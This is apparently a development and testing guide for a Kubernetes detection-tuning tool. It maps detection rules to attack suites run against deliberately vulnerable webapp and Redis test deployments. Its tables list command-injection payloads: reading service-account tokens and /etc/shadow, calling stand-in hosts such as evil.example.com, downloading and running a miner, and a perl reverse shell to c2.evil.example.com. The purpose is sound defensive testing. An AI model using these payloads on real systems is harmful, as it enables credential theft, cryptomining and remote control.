# Autotuning Development & Testing Guide

Ground truth for how we develop and test `bobctl` autotuning locally.

## Architecture

```
bobctl collapse   →  cluster-wide CollapseConfiguration CRD
bobctl tune       →  per-app profile tuning (baseline test + FP refinement)
bobctl attack     →  run attack suite, report results
bobctl report     →  fetch alertmanager alerts, format as markdown
```

All HTTP traffic (benign, attacks, alertmanager queries) routes through
the Kubernetes API server service proxy — no port-forwarding needed.

## Applications Under Test

### Webapp (PHP ping.php)

| Property | Value |
|----------|-------|
| Namespace | `webapp` |
| Manifest | `example/webapp-manifest.yaml` |
| Service | `webapp-mywebapp:8080` → container port 80 |
| Container | `mywebapp-app` |
| Image | `ghcr.io/k8sstormcenter/webapp` (pinned by sha256) |
| Base OS | Debian (PHP/Apache) |
| Tools available | `cat`, `ls`, `whoami`, `curl`, `wget`, `ping`, `php` |

**Vulnerability**: Command injection via `ping.php?ip=<payload>`.
The page runs `ping -c1 $ip` without sanitizing — semicolons chain arbitrary commands.

**There is NO LFI, SSRF, or SQL injection vulnerability in this webapp.**
All attacks are command injection + post-exploitation via the injected shell.

### Redis (CVE-2025-49844)

| Property | Value |
|----------|-------|
| Namespace | `redis` |
| Manifest | `example/redis-vulnerable.yaml` |
| Service | `redis:6379` |
| Container | `redis` |
| Image | `ghcr.io/k8sstormcenter/redis-vulnerable:7.2.10` |
| Protocol | RESP (raw TCP, needs port-forward) |

**Vulnerability**: CVE-2025-49844 — Use-after-free in Lua parser + CVE-2022-0543
Lua sandbox escape. Exploit chain: heap spray → GC trigger → fileless execution
via `memfd_create` + `execve`.

## Detection Rules Reference

Rules from `kubescape/default-rules.yaml`. Only rules with `isTriggerAlert: true` fire alerts.

| Rule ID | Name | Triggers Alert | Profile-Dependent |
|---------|------|:-:|:-:|
| R0001 | Unexpected process launched | YES | YES |
| R0002 | Files Access Anomalies in container | YES | YES |
| R0003 | Syscalls Anomalies in container | no | YES |
| R0004 | Linux Capabilities Anomalies in container | no | YES |
| R0005 | DNS Anomalies in container | YES | YES |
| R0006 | Unexpected service account token access | YES | YES |
| R0007 | Workload uses Kubernetes API unexpectedly | no | YES |
| R0010 | Unexpected Sensitive File Access | YES | no |
| R0011 | Unexpected Egress Network Traffic | no | YES |
| R1001 | Drifted process executed | YES | no |
| R1005 | Fileless execution detected | YES | no |
| R1007 | Crypto miner launched (RandomX) | YES | no |
| R1008 | Crypto Mining Domain Communication | YES | no |
| R1009 | Crypto Mining Related Port Communication | no | no |
| R1010 | Soft link created over sensitive file | YES | no |

**Profile-dependent** = rule only fires if the action is NOT in the ApplicationProfile.
**Not profile-dependent** = rule fires regardless (e.g., R0010 always flags /etc/shadow).

## Webapp Attack Catalog

### Currently Implemented

| Attack | Payload via ping.php | Expected Rules | Status |
|--------|---------------------|----------------|--------|
| cmdinject-sa-token | `;cat /var/run/secrets/.../token` | R0001, R0006 | Active |
| cmdinject-etc-passwd | `;cat /etc/passwd` | R0001 | Active |
| cmdinject-whoami | `;whoami` | R0001 | Active |
| cmdinject-ls-secrets | `;ls /var/run/secrets/.../` | R0001 | Active |
| postexploit-etc-shadow | `;cat /etc/shadow` | R0010 | Active (detection TBD) |
| postexploit-dns-anomaly | `;curl -sm2 http://evil.example.com` | R0005 | Active (detection TBD) |
| postexploit-drifted-binary | `;cp /bin/ls /tmp/drifted && /tmp/drifted` | R1001 | Active (detection TBD) |

### Planned (not yet implemented)

| Attack | Payload | Expected Rules | Node-Agent Test Reference |
|--------|---------|----------------|--------------------------|
| Crypto miner injection | `;curl -o /tmp/xmrig <url> && /tmp/xmrig --bench 1M` | R1007, R1001 | Test_10c |
| Crypto mining domain | `;nslookup xmr.pool.minergate.com` | R1008 | Test_02 (malicious.go L206) |
| Crypto mining port | `;curl telnet://xmr.pool.minergate.com:45700` | R1009 | Test_02 (malicious.go L207) |
| Symlink exec (shm) | `;ln -s /bin/ls /dev/shm/x && /dev/shm/x` | R1010 | Test_02 (malicious.go L144) |
| File write anomaly | `;echo pwned > /tmp/malicious.txt` | R0002 | Test_02 (malicious.go L81) |
| Egress to unknown IP | `;curl -sm2 http://8.8.8.8` | R0011 | Test_28c |
| DNS MITM detection | (requires CoreDNS manipulation) | R0011 | Test_28d/28e/28f |
| Process from mount | (requires volume mount exploitation) | R1004 | Test_02 (malicious.go L186) |

## Node-Agent Component Test Mapping

The node-agent has 32 component tests in `node-agent/tests/component_test.go`.
These are the tests whose attack patterns we can reuse for webapp tuning:

### Test_01: BasicAlertTest — Process + DNS Detection
- **Attacks**: `ls -l` (unexpected process), `curl ebpf.io` (DNS anomaly)
- **Rules**: R0001, R0005
- **Webapp reuse**: Direct — all via ping.php command injection

### Test_02: AllAlertsFromMaliciousApp — Comprehensive Attack
The "malicious.go" binary (`node-agent/tests/images/malicious-app/malicious.go`) runs:

| Action | Rule | Webapp Equivalent |
|--------|------|-------------------|
| Download + exec kubectl | R0001, R0006, R0007 | `;curl -o /tmp/kubectl <url> && /tmp/kubectl get secrets` |
| Open SA token file | R0006 | `;cat /var/run/secrets/.../token` |
| Write malicious.txt | R0002 | `;echo pwned > /tmp/evil.txt` |
| Syscall: unshare | R0003 | Not replicable via shell |
| Bind port 80 | R0004 | Not replicable via shell |
| Symlink /bin/ls → /dev/shm/ls + exec | R1010 | `;ln -s /bin/ls /dev/shm/x && /dev/shm/x` |
| Copy kubectl to /podmount + exec | R1004 | Needs volume mount |
| HTTP to google.com | R0005 | `;curl -sm2 http://google.com` |
| TCP to mining pool :45700 | R1009 | `;curl telnet://xmr.pool.minergate.com:45700` |
| Insmod syscall | R1002 | Not replicable via shell |

### Test_10: MalwareDetectionTest — Crypto Miner
- **10b**: Empty AP + `cat /etc/hostname` → R0001, R0002, R0003, R0004
- **10c**: xmrig benchmark → R1007 (RandomX detection, x86_64 only)
- **Webapp reuse**: Could inject xmrig download + execution via ping.php

### Test_12: MergingProfilesTest — Profile Merge Behavior
- **Attack**: `ls -l` in wrong container (alert), then merge profile (no alert)
- **Rules**: R0001
- **Webapp reuse**: Tests AllowedProcesses/PolicyByRuleId — exactly what `bobctl tune` does

### Test_27: ApplicationProfileOpens — File Access Wildcards
- **Tests**: Exact path match, ellipsis match (`/etc/⋯`), wildcard match (`/etc/*`)
- **Rules**: R0002
- **Webapp reuse**: `;cat /etc/hostname`, `;cat /etc/nginx/nginx.conf`, etc.

### Test_28: UserDefinedNetworkNeighborhood — DNS/Egress Detection
- **28a**: Allowed domain (no alert)
- **28b**: Unknown domain → R0005
- **28c**: Unknown IP → R0011
- **28d**: DNS spoofing (MITM) → R0011
- **28e/f**: CoreDNS poisoning → R0011 (only when TCP egress follows)
- **Webapp reuse**: `;curl -sm2 http://evil.com`, `;nslookup evil.com`

### Test_29-30: Signed Profiles
- Tests signature verification on ApplicationProfiles
- **Webapp reuse**: Relevant for `bobctl sign` (Phase 3)

### Test_32: CollapseConfiguration CRD
- Tests that CollapseConfiguration controls path wildcarding during learning
- **Webapp reuse**: Exactly what `bobctl collapse` does

### Not Reusable from Webapp

| Test | Why |
|------|-----|
| Test_03-05 | Performance/memory tests |
| Test_06-09 | Infrastructure/state machine tests |
| Test_11 | Endpoint profiling (HTTP path patterns) |
| Test_14-26 | Profile lifecycle, cooldown, partial AP tests |

## Redis Attack Catalog

All 12 attacks exploit CVE-2022-0543 (Lua sandbox escape via `package.loadlib` /
direct `io` access) on the `redis-vulnerable:7.2.10` image. Each attack escapes
the Lua sandbox via `EVAL`, then runs an OS command that triggers a specific
detection rule. Tools available in the container: `perl`, `getent`, `awk`, `id`,
`cat`, `cp`, `ln`, `ls`, `whoami`, `rm`. NOT available: `curl`, `wget`, `nslookup`.

| # | Attack | OS Command | Expected Rules | Verified |
|---|--------|-----------|----------------|----------|
| 01 | fileless-memfd-exec | `perl` memfd_create+execve | R1005 | YES |
| 02 | sa-token-exfil | `cat /var/run/secrets/.../token` | R0006 | YES |
| 03 | read-etc-shadow | `cat /etc/shadow` (open triggers) | R0010 | tracer-dep |
| 04 | unexpected-process-whoami | `whoami` | R0001 | YES |
| 05 | dns-anomaly-evil-domain | `getent hosts evil.attacker.example.com` | R0005 | YES |
| 06 | drifted-binary-exec | `cp /bin/ls /tmp/drifted_redis && exec` | R1001 | YES |
| 07 | exec-from-devshm | `cp /bin/echo /dev/shm/malicious && exec` | R1000 | YES |
| 08 | read-proc-environ | `cat /proc/1/environ` | R0008 | YES |
| 09 | symlink-etc-shadow | `ln -sf /etc/shadow /tmp/shadow_link` | R1010 | tracer-dep |
| 10 | crypto-mining-dns | `getent hosts xmr.pool.minergate.com` | R1008 | YES |
| 11 | reverse-shell-perl-http | `perl IO::Socket c2.evil.example.com` | R0001+R0005 | YES |
| 12 | credential-harvest-passwd | `awk /etc/passwd && id` | R0001 | YES |

Individual attack files for parallel agent execution are in `example/redis-tests/attack-NN-*.yaml`.

The CI and `local-ci.sh --app redis` run the full 12-attack suite through bobctl
AND execute direct kubectl-based attacks for verification.

## Tuning Algorithm

```
Phase 0: Fetch baseline (immutable deep copy of the learned profile)
Phase 1: Baseline test — apply as-is, run attacks + benign, score
Phase 2: FP refinement — for each FP alert, add triggering process
         to AllowedProcesses for that specific rule (surgical)
```

**Key invariants**:
1. The learned baseline profile is NEVER modified
2. Each iteration creates a user-defined profile `ug-<name>-iteration<N>`
3. `containerAllowed` is NEVER set — that disables the rule entirely
4. Only `AllowedProcesses` is used for surgical FP suppression
5. No re-learning between iterations — modify profile, wait 60s for cache refresh

**Score** = MissedDetections + FalsePositives (lower is better, 0 = perfect)

## Consistency Rules

All these files MUST be consistent with each other:

| File | What it defines |
|------|----------------|
| `example/webapp-attacks.yaml` | Attacks + expected detections for webapp |
| `example/webapp-functional-tests.yaml` | Benign traffic for webapp |
| `example/redis-attacks.yaml` | 12 attacks + expected detections for redis |
| `example/redis-functional-tests.yaml` | 21 benign Redis operations |
| `example/redis-tests/attack-NN-*.yaml` | Per-attack files for parallel execution |
| `kubescape/default-rules.yaml` | Rule definitions (names must match alert labels) |
| `pkg/verify/types.go` `DefaultExpectedDetections()` | Hardcoded defaults (webapp) |
| `pkg/autotune/tuner_test.go` `testAttackSuite()` | Unit test attack suite |
| `pkg/autotune/tuner_test.go` `expectedAttackAlerts()` | Unit test expected alerts |

When you change attacks or detections, update ALL of these.

**Rule name matching** uses `strings.EqualFold` (case-insensitive) in `pkg/verify/matchers.go`.

## Local Development

### Prerequisites

- Kind cluster with kubescape (storage + node-agent) in `honey` namespace
- Alertmanager deployed in `honey` namespace
- Storage image `dev-e64d59a` or later (from `feature/collapse-config-crd` branch)
- Go 1.25+

### Full run (setup + learn + collapse + tune)

```bash
./scripts/local-ci.sh
```

### Tune-only rerun (skip infra setup, reuse learned profile)

```bash
./scripts/local-ci.sh --tune-only
```

### Setup infrastructure only

```bash
./scripts/local-ci.sh --setup-only
```

### Redis instead of webapp

```bash
./scripts/local-ci.sh --app redis
```

### Manual step-by-step

```bash
# 1. Build
cd pkg && go build -o ../bin/bobctl ./main.go && cd ..

# 2. Setup (once)
make kubescape
make alertmanager

# 3. Deploy app + learn profile
PROFILE=$(bin/bobctl install \
  --manifest example/webapp-manifest.yaml \
  --functional-tests example/webapp-functional-tests.yaml \
  -n webapp --timeout 3m -v)

# 4. Collapse analysis
bin/bobctl collapse --namespaces webapp --noisy-threshold 10 --apply -v

# 5. Tune
bin/bobctl tune \
  --profile "$PROFILE" -n webapp --ks-namespace honey \
  --functional-tests example/webapp-functional-tests.yaml \
  --attack-suite example/webapp-attacks.yaml \
  --output-dir results --max-rounds 3 --debug -v

# 6. Standalone attack + report
bin/bobctl attack --attack-suite example/webapp-attacks.yaml -n webapp
bin/bobctl report --alertmanager-service alertmanager --alertmanager-port 9093 \
  --ks-namespace honey -n webapp --format markdown
```

### Unit tests

```bash
cd pkg
go test -short ./...                         # all packages
go test ./pkg/autotune/... -v                # tuner tests only
go test ./pkg/profile/... -v                 # profile manipulation tests
go test ./pkg/verify/... -v                  # verification logic
go test ./pkg/attack/... -v                  # attack suite parsing + RESP
```

## Infrastructure

### Kubescape Helm Values

`kubescape/values.yaml` — key settings:
- `maxLearningPeriod: 2m` / `learningPeriod: 2m` — fast learning for dev
- `updatePeriod: 10000m` — effectively disable auto-updates
- `ruleCooldown: 0h / 1000000000 count` — no alert cooldown
- Storage + node-agent images: `ghcr.io/k8sstormcenter/{storage,node-agent}:dev-e64d59a`
- Namespace: `honey`

### Alertmanager

`kubescape/alertmanager.yaml` — minimal deployment, port 9093, no receivers.
Node-agent is configured to export to `alertmanager.honey.svc.cluster.local:9093`.

### Default Rules

`kubescape/default-rules.yaml` — see Detection Rules Reference table above.

## CI Workflow

`.github/workflows/ci-bobctl-autotune.yaml` — matrix across:
- OS: ubuntu-22.04, ubuntu-24.04
- App: webapp, redis
- Cluster: k3s

Steps: build → k3s setup → kubescape install → alertmanager → app install →
profile learning → collapse analysis → tune → attacks → report → diagnostics.

### Storage Branch

CI clones storage from `feature/tuning` branch (has `CollapseSettings`, `ParseCollapseSettings`).
The `feature/collapse-config-crd` branch adds the CollapseConfiguration CRD type.

## Adding a New Application

1. Create `example/<app>-manifest.yaml` (Namespace + Deployment + Service)
2. Create `example/<app>-functional-tests.yaml` (benign traffic definition)
3. Create `example/<app>-attacks.yaml` (attacks + expected detections)
4. Add app case to `scripts/local-ci.sh`
5. Add matrix entry to `.github/workflows/ci-bobctl-autotune.yaml`
6. Update this document with the new app's attack catalog
7. Test: `./scripts/local-ci.sh --app <app>`
